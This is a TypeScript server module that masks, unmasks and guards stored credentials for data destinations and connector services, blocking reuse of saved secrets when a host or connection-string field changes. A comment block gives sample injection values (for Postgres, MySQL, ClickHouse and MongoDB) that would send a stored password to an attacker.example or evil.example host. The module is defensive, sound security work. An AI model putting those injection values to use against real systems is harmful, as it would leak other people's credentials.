import { coreDestinationsMap, MASKED_SECRET } from "./destinations";
import { PropertyUI } from "./destinations";
import { db } from "../server/db";
import { getServerLog } from "../server/log";
import get from "lodash/get";
import set from "lodash/set";
import unset from "lodash/unset";

import isPlainObject from "lodash/isPlainObject";
import isEqual from "lodash/isEqual";
import { ApiError } from "../shared/errors";

const log = getServerLog("secrets");

/**
 * Get all secret field paths for a destination type
 */
export function getDestinationSecretPaths(destinationType: string): string[] {
  const destination = coreDestinationsMap[destinationType];
  if (!destination) {
    return [];
  }

  const secretPaths: string[] = [];
  const credentialsUi = destination.credentialsUi || {};

  // Check each field in credentialsUi for password: true
  Object.entries(credentialsUi).forEach(([fieldName, fieldUi]) => {
    const ui = fieldUi as PropertyUI;
    if (ui.password) {
      secretPaths.push(fieldName);
    }
  });

  return secretPaths;
}

/**
 * Names of the fields of a destination type that decide where its secrets are sent (`target: true` in `credentialsUi`)
 */
export function getDestinationTargetKeys(destinationType: string): string[] {
  const credentialsUi = coreDestinationsMap[destinationType]?.credentialsUi || {};
  return Object.entries(credentialsUi)
    .filter(([, ui]) => (ui as PropertyUI).target)
    .map(([fieldName]) => fieldName);
}

type NoUsableSpec = "missing" | "empty" | "malformed" | "error";

const NO_SPEC_WARNING_EVERY_MS = 5 * 60 * 1000;
const NO_SPEC_WARNING_KEYS_MAX = 1000;
const lastNoSpecWarning = new Map<string, number>();

/**
 * One warning per package@version every five minutes. Package and version are strings any member can send, so the
 * list of what was warned about stays small. Only the name and the reason are logged, never a credential.
 */
function warnNoUsableSpec(packageName: string, version: string, reason: NoUsableSpec) {
  const key = `${packageName}@${version}`;
  const now = Date.now();
  const last = lastNoSpecWarning.get(key);
  if (last !== undefined && now - last < NO_SPEC_WARNING_EVERY_MS) {
    return;
  }
  lastNoSpecWarning.delete(key);
  lastNoSpecWarning.set(key, now);
  if (lastNoSpecWarning.size > NO_SPEC_WARNING_KEYS_MAX) {
    lastNoSpecWarning.delete(lastNoSpecWarning.keys().next().value as string);
  }
  log
    .atWarn()
    .log(
      `No usable connector spec for ${key} (${reason}): masking every credential value of its services until the spec exists`
    );
}

/**
 * A path to a secret: a dotted string (`credentials.password`, from a connector spec, where keys are plain names) or a
 * list of keys. Credentials of a service can have any key (`a.b`, `a[0]`, `__proto__`), and a string path would be
 * read as several keys, so the paths built from the data itself are lists and are only read by the own-key helpers.
 */
export type SecretPath = string | string[];

const hasOwn = (node: any, key: string) => node !== null && typeof node === "object" && Object.hasOwn(node, key);
const getOwn = (node: any, keys: string[]) => {
  for (const key of keys) {
    if (!hasOwn(node, key)) {
      return undefined;
    }
    node = node[key];
  }
  return node;
};
const defineOwn = (node: any, key: string, value: any) =>
  Object.defineProperty(node, key, { value, enumerable: true, writable: true, configurable: true });
const keysOf = (path: SecretPath): string[] => (Array.isArray(path) ? path : path.split("."));
const valueAt = (obj: any, path: SecretPath) => (Array.isArray(path) ? getOwn(obj, path) : get(obj, path));
const labelOf = (path: SecretPath) => keysOf(path).join(".");

/**
 * Paths of every value under `credentials` of the given objects (a stored service, an incoming patch). Plain objects
 * are walked by key and arrays by index, down to the leaf, because the guard in `assertSecretsStayWithTarget` asks
 * for each secret separately: masking a whole group would let a patch with one nested field count as supplying it all.
 * Masking an entry keeps the shape of the value, which the editor and a clone depend on.
 */
function credentialLeafPaths(sources: any[]): string[][] {
  const paths = new Map<string, string[]>();
  const walk = (node: any, path: string[]) => {
    if (isPlainObject(node)) {
      Object.keys(node).forEach(key => walk(node[key], [...path, key]));
    } else if (Array.isArray(node)) {
      node.forEach((item, index) => walk(item, [...path, String(index)]));
    } else {
      paths.set(JSON.stringify(path), path);
    }
  };
  for (const source of sources) {
    if (source?.credentials !== undefined && source?.credentials !== null) {
      walk(source.credentials, ["credentials"]);
    }
  }
  return [...paths.values()];
}

/**
 * Get all secret field paths for a service (Airbyte source).
 *
 * `sources` are the objects whose credentials are about to be shown, stored or kept (the stored service, the patch).
 * When the connector spec is missing or unusable nothing says which field is a secret, so every value under
 * `credentials` of those objects is one: it is masked on output, a mask is never stored over the real value and the
 * target guard stays on. A usable spec that lists no secret field still gives `[]`.
 */
export async function getServiceSecretPaths(
  packageName: string,
  version: string,
  ...sources: any[]
): Promise<SecretPath[]> {
  let reason: NoUsableSpec;
  try {
    const sourceSpec = await db.prisma().source_spec.findUnique({
      where: {
        package_version: {
          package: packageName,
          version: version,
        },
      },
    });

    if (!sourceSpec) {
      reason = "missing";
    } else if (!sourceSpec.specs) {
      reason = "empty";
    } else {
      const specs = sourceSpec.specs as any;
      const connectionSpec = specs.connectionSpecification;
      if (isPlainObject(connectionSpec?.properties)) {
        return serviceSpecSecretPaths(connectionSpec.properties);
      }
      reason = "malformed";
    }
  } catch (error) {
    log.atError().withCause(error).log(`Failed to get service secret paths for ${packageName}@${version}`);
    reason = "error";
  }
  warnNoUsableSpec(packageName, version, reason);
  return credentialLeafPaths(sources);
}

/** Paths of the fields a usable spec marks `airbyte_secret: true`, under `credentials` */
function serviceSpecSecretPaths(properties: any): string[] {
  const secretPaths: string[] = [];

  // Recursively find all fields with airbyte_secret: true
  function findSecretFields(properties: any, basePath: string = "") {
    Object.entries(properties).forEach(([key, schema]: [string, any]) => {
      const currentPath = basePath ? `${basePath}.${key}` : key;

      if (schema.airbyte_secret === true) {
        secretPaths.push(`credentials.${currentPath}`);
      }

      // Handle oneOf/anyOf schemas
      if (schema.oneOf || schema.anyOf) {
        const options = schema.oneOf || schema.anyOf;
        options.forEach((option: any) => {
          if (option.properties) {
            findSecretFields(option.properties, currentPath);
          }
        });
      }

      // Recurse into nested objects
      if (schema.type === "object" && schema.properties) {
        findSecretFields(schema.properties, currentPath);
      }
    });
  }

  findSecretFields(properties);
  return secretPaths;
}

/**
 * Mask secret values in an object based on the field paths
 */
export function maskSecrets(obj: any, secretPaths: SecretPath[]): any {
  if (!obj || typeof obj !== "object") {
    return obj;
  }

  const result = JSON.parse(JSON.stringify(obj)); // Deep clone

  for (const path of secretPaths) {
    const value = valueAt(obj, path);
    if (typeof value === "undefined") {
      continue; // We don't mask non-set values
    }
    if (Array.isArray(path)) {
      const parent = getOwn(result, path.slice(0, -1));
      if (path.length > 0 && parent !== null && typeof parent === "object") {
        defineOwn(parent, path[path.length - 1], MASKED_SECRET);
      }
    } else {
      set(result, path, MASKED_SECRET);
    }
  }

  return result;
}

/**
 * Remove masked values from an object before merge. A masked entry of a list is left where it is: removing it would
 * leave a hole (stored as null), and a list is replaced as a whole by a merge.
 */
export function removeMaskedValues(obj: any, secretPaths: SecretPath[]): any {
  if (!obj || typeof obj !== "object") {
    return obj;
  }

  const result = JSON.parse(JSON.stringify(obj)); // Deep clone

  for (const path of secretPaths) {
    if (valueAt(obj, path) !== MASKED_SECRET) {
      continue;
    }
    if (Array.isArray(path)) {
      const parent = getOwn(result, path.slice(0, -1));
      if (path.length > 0 && parent !== null && typeof parent === "object" && !Array.isArray(parent)) {
        delete parent[path[path.length - 1]];
      }
    } else {
      unset(result, path); // Remove the masked value
    }
  }

  return result;
}

/** The value as the fallback masking returns it: same objects and lists, every other value a mask */
export function maskedShape(value: any): any {
  if (Array.isArray(value)) {
    return value.map(maskedShape);
  }
  if (isPlainObject(value)) {
    const copy = {};
    for (const [key, item] of Object.entries(value)) {
      defineOwn(copy, key, maskedShape(item));
    }
    return copy;
  }
  return MASKED_SECRET;
}

const LIST_CHANGED = (path: string[]) =>
  new ApiError(
    `Cannot keep the saved values of ${path.join(
      "."
    )} because the list was changed. Enter the values of the whole list again to continue.`,
    { status: 400 }
  );

const KEEP_STORED = Symbol("keep stored value");

/**
 * Remove every masked value under `credentials` of a service, whatever the spec lists as secret. A client that read the
 * service while its spec was missing holds masks for ordinary fields (a host) too, and sends them back after the spec
 * has arrived, when only the listed secrets are known: a mask must never be stored over a value.
 *
 * A key with a mask is dropped, so that a merge keeps the stored value. A list is replaced as a whole by a merge, and
 * a mask in it says nothing about which stored entry it stands for once the list was edited (a row deleted in the
 * editor shifts the rest). So a list that holds masks is the masked copy of the stored list, untouched, and the stored
 * one is kept, or it is refused. `stored` is the service before the change; a new service has none, and the masked
 * entries of its lists are left out.
 */
export function removeMaskedCredentials(obj: any, stored?: any): any {
  if (!obj || typeof obj !== "object" || obj.credentials === undefined) {
    return obj;
  }
  const result = JSON.parse(JSON.stringify(obj)); // Deep clone
  if (result.credentials === MASKED_SECRET) {
    delete result.credentials;
    return result;
  }
  const without = (node: any, before: any, path: string[]): any => {
    if (Array.isArray(node)) {
      if (!containsMaskedSecrets(node)) {
        return node;
      }
      if (!Array.isArray(before)) {
        return node.filter(item => item !== MASKED_SECRET).map(item => without(item, undefined, path));
      }
      if (isEqual(node, maskedShape(before))) {
        return KEEP_STORED;
      }
      throw LIST_CHANGED(path);
    }
    if (isPlainObject(node)) {
      const copy = {};
      for (const [key, value] of Object.entries(node)) {
        if (value !== MASKED_SECRET) {
          const kept = without(value, hasOwn(before, key) ? before[key] : undefined, [...path, key]);
          if (kept !== KEEP_STORED) {
            defineOwn(copy, key, kept);
          }
        }
      }
      return copy;
    }
    return node;
  };
  result.credentials = without(result.credentials, stored?.credentials, ["credentials"]);
  return result;
}

/**
 * Recursively replaces all occurrences of MASKED_SECRET in object with actual values from dbEntity.
 *
 * @param object - The d object being sent
 * @param dbEntity - The original entity from database containing real secret values
 * @param comparedWith - The original entity with schema defaults applied, to tell a changed target from a default
 * @returns A new object with masked secrets replaced by values from db
 */
export function unmaskSecretsFromOriginal(object: any, dbEntity: any, comparedWith: any = dbEntity): any {
  if (!object || !dbEntity) {
    return object;
  }

  // `object` is parsed with the schema defaults (a PostHog config without a host gets the default host), the stored
  // config is not, so callers pass the stored one with the same defaults applied to compare against.
  const changedTargets = changedConnectionTargets(object, comparedWith);
  // Only signing keys masked (webhook signatureSecret): they sign requests and are never sent to the target
  const onlySigningKeysMasked = maskedPaths(object).every(path => isSigningKey(dbEntity, path[path.length - 1]));
  const breakers = connectionStringBreakers(object, comparedWith);
  if (breakers.fields.length > 0 && !onlySigningKeysMasked && containsMaskedSecrets(object)) {
    throw new ApiError(connectionStringError(breakers), { status: 400 });
  }
  if (changedTargets.length > 0 && !onlySigningKeysMasked) {
    // Restoring the stored password into a config that points somewhere else would send it to that host
    throw new ApiError(
      `Cannot reuse saved secrets because ${changedTargets.join(
        ", "
      )} changed. Enter the secret values again to continue.`,
      { status: 400 }
    );
  }

  // Deep clone object to avoid mutating the original
  const result = JSON.parse(JSON.stringify(object));

  // Recursively find and replace masked secrets
  replaceMaskedSecrets(result, dbEntity, []);

  return result;
}

// Fields that decide where a credential is sent. A destination says which ones they are in its schema
// (`target: true` in `credentialsUi`). A service (an Airbyte connector) has no such marker in its spec, so there they
// are guessed from the name: host, url, endpoint, an API base, etc.
// `port` is left out on purpose: the submitted object is parsed with schema defaults, so a default port
// shows up as a difference against a stored config that never had one, and a port alone does not change the host
// `connection_string` (the MongoDB v2 connector: a non-secret string next to a secret password) and a field named exactly
// `shop` (the WooCommerce connector: the store's domain next to its API key and secret) came from the production
// connector specs, where the name rule missed them. `shop` is matched whole so `shop_id` and the like stay out. A name
// list will keep missing fields; replacing it with a rule read from the spec is a separate decision (JITSU-285).
const CONNECTION_TARGET_KEY =
  /host|url|uri|endpoint|server|address|domain|api_?base|instance_?connection_?name|connection_?string|^shop$/i;
// TLS material (`sslServerCA` contains "server") says how to trust the target, not where it is
const TLS_KEY = /ssl|tls|cert/i;

const isEmptyValue = (v: any) =>
  v === undefined ||
  v === null ||
  v === "" ||
  (Array.isArray(v) && v.length === 0) ||
  (isPlainObject(v) && Object.keys(v).length === 0);

/** A list of plain values (ClickHouse and MongoDB `hosts`) is one target value, not a container to look inside. */
const isValueList = (v: any) => Array.isArray(v) && v.every(item => item === null || typeof item !== "object");

type TargetMatcher = {
  isTarget: (key: string, path: (string | number)[]) => boolean;
  /** a target is compared as one value (a list of hosts, a parameters object), not looked into */
  isOneValue: (value: any) => boolean;
};

const nameMatcher: TargetMatcher = {
  isTarget: key => CONNECTION_TARGET_KEY.test(key) && !TLS_KEY.test(key),
  isOneValue: isValueList,
};

/**
 * Which fields are targets in these objects. A destination of a known type uses the fields its schema marks, at the top
 * level of the config only. Anything else (a service, an unknown type) falls back to the field names.
 *
 * The type is the one of the stored object. The submission is chosen by the caller, who can add
 * `destinationType: "postgres"` to a service so that its nested `credentials.host` is not looked at; a submitted type
 * that differs from the stored one gets the stricter field-name rule too.
 */
const targetMatcherFor = (updated: any, original: any): TargetMatcher => {
  const type = original?.destinationType;
  const submitted = updated?.destinationType;
  if (typeof type !== "string" || !coreDestinationsMap[type] || (submitted !== undefined && submitted !== type)) {
    return nameMatcher;
  }
  const keys = new Set(getDestinationTargetKeys(type));
  return { isTarget: (key, path) => path.length === 0 && keys.has(key), isOneValue: () => true };
};

/**
 * Paths of connection target fields (host, url, endpoint...) whose value in `object` differs from `original`.
 * Only meaningful for an object that contains masked secrets: it tells whether the stored secrets
 * would be carried over to a different target.
 */
export function changedConnectionTargets(object: any, original: any): string[] {
  return containsMaskedSecrets(object)
    ? [
        ...changedDestinationType(object, original),
        ...changedServiceImage(object, original),
        ...findChangedTargets(object, original, [], targetMatcherFor(object, original)),
      ]
    : [];
}

/**
 * The stored secrets belong to the stored destination type, and another type reads other fields (a MySQL destination's
 * `parameters` are a target, a Postgres one has none). Keeping them while the type changes is a change of target in
 * itself, so the secrets have to be entered again. Only a stored type can change: a service has none.
 */
function changedDestinationType(updated: any, original: any): string[] {
  return typeof updated?.destinationType === "string" &&
    typeof original?.destinationType === "string" &&
    updated.destinationType !== original.destinationType
    ? ["destinationType"]
    : [];
}

/**
 * A service (an Airbyte connector) is a Docker image that receives the stored credentials in its config file, so the
 * image is where they go: another `package` can read and send them anywhere, with no host field changing. A new
 * `version` of the same package is not a target (an upgrade must not ask for the credentials again; the tags of a
 * package are controlled by whoever owns it).
 */
function changedServiceImage(updated: any, original: any): string[] {
  return typeof updated?.package === "string" &&
    typeof original?.package === "string" &&
    updated.package.trim() !== original.package.trim()
    ? ["package"]
    : [];
}

function findChangedTargets(node: any, original: any, path: (string | number)[], matcher: TargetMatcher): string[] {
  if (Array.isArray(node)) {
    return node.flatMap((item, index) => findChangedTargets(item, original, [...path, index], matcher));
  }
  if (!isPlainObject(node)) {
    return [];
  }
  return Object.entries(node).flatMap(([key, value]) => {
    const currentPath = [...path, key];
    const isTarget = matcher.isTarget(key, path);
    if ((isPlainObject(value) || Array.isArray(value)) && !(isTarget && matcher.isOneValue(value))) {
      return findChangedTargets(value, original, currentPath, matcher);
    }
    if (value === MASKED_SECRET || !isTarget) {
      return [];
    }
    const before = get(original, currentPath);
    // an empty optional target is the same as an omitted one (S3 `endpoint: ""` is the default AWS endpoint)
    if (isEmptyValue(value) && isEmptyValue(before)) {
      return [];
    }
    // a list of targets read while its values were masked, and sent back untouched, is the same list
    return isEqual(value, before) || isEqual(value, maskedShape(before)) ? [] : [currentPath.join(".")];
  });
}

// Bulker builds some connection strings by formatting the fields into one string, so a delimiter in a name field changes
// what the string means, while the stored password is still filled in:
// - Postgres and Redshift: `host=.. dbname=.. user=.. password=.. search_path=..`, no quoting. A space starts a new
//   setting, so `database: "events host=attacker.example"` connects to that host.
// - MySQL: `user:password@tcp(host:port)/database`, split by the driver at its last '@' and '/'. A database such as
//   `x@tcp(attacker.example:3306)/events` connects to that address and sends it a password starting with the stored one.
//   (A username cannot move the connection that way, and `user@server` usernames are legitimate, so only `database`.)
// - ClickHouse: `protocol://user:password@hosts/database?param=value`, with the database put in as it is. A `?` starts
//   the query string, so `events?http_proxy=http://attacker.example:8080` sets a driver option that carries the
//   authenticated requests through that proxy, and a `#` cuts the name and drops the parameters after it. An `&` before
//   the first `?` is plain path text (checked against clickhouse-go 2.45.0), so `R&D` is a valid name.
// - MongoDB (rotor, not Bulker): `protocol://username:password@hosts/database?options`, concatenated with no escaping
//   (services/rotor/src/lib/mongodb-destination.ts). An `@` in the username ends the credentials early, so
//   `x:y@evil.example:27017/?appName=` moves the host, and the stored password follows as the value of `appName`. A `?`
//   in the database starts the options (`authMechanism=PLAIN`, `proxyHost`), and a `#` cuts the rest. Checked against the
//   mongodb driver 7.1.1 (parse only). rotor does not percent-encode the values and neither does this check: a stored
//   value may already be encoded for the driver, and encoding it again would break a working connection.
// Bulker now quotes or avoids the string (JITSU-270; ClickHouse is not covered there), but a console talking to an older
// Bulker must not rely on that.
const CONNECTION_STRING_TYPES: Record<string, { fields: string[]; breaker: RegExp; what: string }> = {
  postgres: {
    fields: ["database", "username", "defaultSchema"],
    breaker: /[\s'\\]/,
    what: "a space, quote or backslash",
  },
  redshift: {
    fields: ["database", "username", "defaultSchema"],
    breaker: /[\s'\\]/,
    what: "a space, quote or backslash",
  },
  mysql: { fields: ["database"], breaker: /[@/?]/, what: "@, / or ?" },
  clickhouse: { fields: ["database"], breaker: /[?#]/, what: "? or #" },
  mongodb: { fields: ["username", "database"], breaker: /[@/?#]/, what: "@, /, ? or #" },
};

/**
 * Fields of a Postgres, Redshift, MySQL, ClickHouse or MongoDB destination whose value would split or move the connection string, and what
 * is wrong with them. Whitespace at either end is ignored: it cannot start a setting (the Postgres reader skips it
 * after `=` and ends the value at it), and a stored schema with a leading space exists in production and has always
 * worked.
 */
export function connectionStringBreakers(object: any, original: any): { fields: string[]; what: string } {
  // The stored type decides. A submitted type that differs from it is checked as well, never instead: the caller
  // chooses it, and as another type (MySQL, which only looks at `@ / ?`) a Postgres setting in `database` would pass.
  const known = (t: any): t is string =>
    typeof t === "string" && Object.prototype.hasOwnProperty.call(CONNECTION_STRING_TYPES, t);
  const storedType = original?.destinationType;
  const types = typeof storedType === "string" ? [storedType, object?.destinationType].filter(known) : [];
  for (const type of new Set(types)) {
    const { fields, breaker, what } = CONNECTION_STRING_TYPES[type];
    const found = fields.filter(field => typeof object?.[field] === "string" && breaker.test(object[field].trim()));
    if (found.length > 0) {
      return { fields: found, what };
    }
  }
  return { fields: [], what: "" };
}

const connectionStringReason = ({ fields, what }: { fields: string[]; what: string }) =>
  `${fields.join(", ")} contains ${what}, which would change the connection`;

const connectionStringError = (breakers: { fields: string[]; what: string }) =>
  `Cannot reuse saved secrets because ${connectionStringReason(breakers)}. Enter the secret values again to continue.`;

// Secrets that are used to sign requests and are never sent to the connection target. Only a webhook destination has
// them: the receiver gets the signature, not the key. A service is different: its connector image receives the whole
// credentials object, so a secret named like a signing key is sent to the target like any other, and the exemption
// would let a changed `package` or host keep it. The stored type decides, never the submitted one.
const SIGNING_KEY = /signature|signing|hmac/i;
const isSigningKey = (stored: any, name: unknown) =>
  stored?.destinationType === "webhook" && SIGNING_KEY.test(String(name ?? ""));

/** Paths of every MASKED_SECRET value in an object. */
function maskedPaths(node: any, path: (string | number)[] = []): (string | number)[][] {
  if (node === MASKED_SECRET) {
    return [path];
  }
  if (Array.isArray(node)) {
    return node.flatMap((item, index) => maskedPaths(item, [...path, index]));
  }
  if (isPlainObject(node)) {
    return Object.entries(node).flatMap(([key, value]) => maskedPaths(value, [...path, key]));
  }
  return [];
}

/**
 * Paths of connection target fields (host, url, endpoint...) whose value differs between two objects, an empty value
 * counting as no value. Unlike {@link changedConnectionTargets} it does not need a masked secret in the object.
 */
export function changedTargetFieldsBetween(updated: any, original: any): string[] {
  return [
    ...changedDestinationType(updated, original),
    ...changedServiceImage(updated, original),
    ...targetFieldsBetween(updated, original, [], targetMatcherFor(updated, original)),
  ];
}

function targetFieldsBetween(updated: any, original: any, path: (string | number)[], matcher: TargetMatcher): string[] {
  if (Array.isArray(updated)) {
    return updated.flatMap((item, index) => targetFieldsBetween(item, original, [...path, index], matcher));
  }
  if (!isPlainObject(updated)) {
    return [];
  }
  return Object.entries(updated).flatMap(([key, value]) => {
    const currentPath = [...path, key];
    const isTarget = matcher.isTarget(key, path);
    if ((isPlainObject(value) || Array.isArray(value)) && !(isTarget && matcher.isOneValue(value))) {
      return targetFieldsBetween(value, original, currentPath, matcher);
    }
    if (!isTarget) {
      return [];
    }
    const before = get(original, currentPath);
    if (isEmptyValue(value) && isEmptyValue(before)) {
      return [];
    }
    return isEqual(value, before) ? [] : [currentPath.join(".")];
  });
}

/**
 * An update that keeps stored secrets (masked values and omitted fields both keep them) must not point the object at
 * a different host: that would send the stored password to wherever the editor says. When a connection target changes,
 * every secret that has a stored value has to be supplied again in the patch.
 *
 * @param original the stored object, before the merge
 * @param patch the incoming patch, with masked values still in it
 * @param merged the result of merging the patch into the original
 */
export function assertSecretsStayWithTarget(original: any, patch: any, merged: any, secretPaths: SecretPath[]): void {
  const changed = changedTargetFieldsBetween(merged, original);
  const breakers = connectionStringBreakers(merged, original);
  if (changed.length === 0 && breakers.fields.length === 0) {
    return;
  }
  const keptSecrets = secretPaths.filter(path => {
    // A signing key (webhook `signatureSecret`) only signs what is sent: the receiver never gets it
    if (isSigningKey(original, keysOf(path).at(-1))) {
      return false;
    }
    const stored = valueAt(original, path);
    if (isEmptyValue(stored)) {
      return false;
    }
    // A secret the merge no longer carries (an entry of a list that was entered again, shorter) is not kept
    if (Array.isArray(path) && !isEqual(getOwn(merged, path), stored)) {
      return false;
    }
    // Walk the path one segment at a time. A string path would let a property literally named `credentials.password`
    // in the patch count as the nested secret (lodash prefers it), while the stored password is kept.
    const supplied = Array.isArray(path) ? getOwn(patch, path) : get(patch, keysOf(path));
    // A mask anywhere inside a secret object keeps the stored value there (the merge drops the mask)
    return isEmptyValue(supplied) || supplied === MASKED_SECRET || containsMaskedSecrets(supplied);
  });
  if (keptSecrets.length > 0) {
    const reason = changed.length > 0 ? `${changed.join(", ")} changed` : connectionStringReason(breakers);
    throw new ApiError(
      `Cannot keep the saved secrets (${keptSecrets
        .map(labelOf)
        .join(", ")}) because ${reason}. Enter the secret values again to continue.`,
      { status: 400 }
    );
  }
}

/**
 * Recursively walks through an object and replaces MASKED_SECRET values with actual values from dbEntity
 *
 * @param obj - Current object being processed
 * @param dbEntity - Original entity from database
 * @param path - Current path in the object structure
 */
function replaceMaskedSecrets(obj: any, dbEntity: any, path: (string | number)[]): void {
  if (!isPlainObject(obj) && !Array.isArray(obj)) {
    return;
  }

  if (Array.isArray(obj)) {
    const stored = get(dbEntity, path);
    if (path.length > 0 && Array.isArray(stored) && containsMaskedSecrets(obj)) {
      // The masks of a list stand for stored entries by position, which is only true while the list is untouched
      // (a row deleted in the editor shifts the rest)
      if (!isEqual(obj, maskedShape(stored))) {
        throw LIST_CHANGED(path.map(String));
      }
      obj.splice(0, obj.length, ...JSON.parse(JSON.stringify(stored)));
      return;
    }
    obj.forEach((item, index) => {
      if (item === MASKED_SECRET) {
        // Replace masked value with value from db at the same path
        const dbValue = get(dbEntity, [...path, index]);
        if (dbValue !== undefined) {
          obj[index] = dbValue;
        }
      } else if (isPlainObject(item) || Array.isArray(item)) {
        replaceMaskedSecrets(item, dbEntity, [...path, index]);
      }
    });
  } else {
    Object.keys(obj).forEach(key => {
      const value = obj[key];
      const currentPath = [...path, key];

      if (value === MASKED_SECRET) {
        // Replace masked value with value from db at the same path
        const dbValue = get(dbEntity, currentPath);
        if (dbValue !== undefined) {
          obj[key] = dbValue;
        }
      } else if (isPlainObject(value) || Array.isArray(value)) {
        replaceMaskedSecrets(value, dbEntity, currentPath);
      }
    });
  }
}

/**
 * Checks if an object contains any masked secrets
 *
 * @param obj - Object to check for masked secrets
 * @returns true if object contains MASKED_SECRET values
 */
export function containsMaskedSecrets(obj: any): boolean {
  if (!obj) {
    return false;
  }

  if (obj === MASKED_SECRET) {
    return true;
  }

  if (Array.isArray(obj)) {
    return obj.some(item => containsMaskedSecrets(item));
  }

  if (isPlainObject(obj)) {
    return Object.values(obj).some(value => containsMaskedSecrets(value));
  }

  return false;
}
